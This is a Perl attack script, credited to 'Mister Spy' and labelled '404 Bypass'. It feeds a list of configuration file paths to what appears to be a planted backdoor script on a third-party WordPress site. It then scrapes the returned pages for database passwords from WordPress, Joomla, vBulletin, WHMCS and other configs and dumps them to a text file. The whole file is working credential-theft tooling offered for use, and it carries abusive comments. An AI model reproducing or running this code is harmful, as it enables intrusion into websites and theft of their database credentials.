#!/usr/bin/perl
#Coded By Wissem Mahfoud
#I am a creative genius.
#RECORDED? Only Changed And Delete COPYRIGHT? Don't Be A Bastard Dude! if u change or edit it u are fucking idiot and kids.
use Digest::MD5 qw(md5 md5_hex md5_base64);
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;
use WWW::Mechanize;
use threads;
system("title Ip Ranger Mister Spy");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }    print color('reset');
print color('red');
$logo="



______                             _____              __ _       
| ___ \                           /  __ \            / _(_)      
| |_/ /_   _ _ __   __ _ ___ ___  | /  \/ ___  _ __ | |_ _  __ _ 
| ___ \ | | | '_ \ / _` / __/ __| | |    / _ \| '_ \|  _| |/ _` |
| |_/ / |_| | |_) | (_| \__ \__ \ | \__/\ (_) | | | | | | | (_| |
\____/ \__, | .__/ \__,_|___/___/  \____/\___/|_| |_|_| |_|\__, |
        __/ | |                                             __/ |
       |___/|_|                                            |___/ 

";
print $logo;
print "\n";
print colored ("                          Type: 404 Bypass \n",'green');
print colored ("                          Author: Mister Spy\n",'cyan');
print color 'reset';
print color("green"), "\n";
print color("green"),"./Select: \n";
print color("green"), "\n";
print color 'reset';
print color("cyan"), "Enter Config Name List :";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
$site = $_;
pass();
}

sub pass(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
my $taz = "https://lubeckwvumc.org/wp-includes/SimplePie/bypass.php?ficonf=$site&namef=spyc&submit=submit";
my $checkfoxup = $ua->get("$taz")->content;
tazx();
sub tazx(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$sex ="https://lubeckwvumc.org/wp-includes/SimplePie/home/";
my $cont = $ua->get("$sex")->content;

# // Fuck Off kids  Spy always a geniuses   //


  print color('reset');

        if ($cont =~ /password = \'(.*?)\';/){ #jm
		print color('bold green');
        print "\t Pass = $1 -Joomla \n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /'DB_PASSWORD\', \'(.*)\'/){ #wordpress
  	    print color('bold green');
        print "\t Pass = $1  - wordpress\n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /password_localhost = "(.*)"/){ #conexao.php
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /password\'] = \'(.*)/){ #vb
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_password = "(.*)"/){ #whmcs
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_pwd =  "(.*)"/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /config\[\'db_pass\'\] = \'(.*)\'/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }
  
else{
print "No PassWord 0x0";
print "\n";

    }

}
        }
	

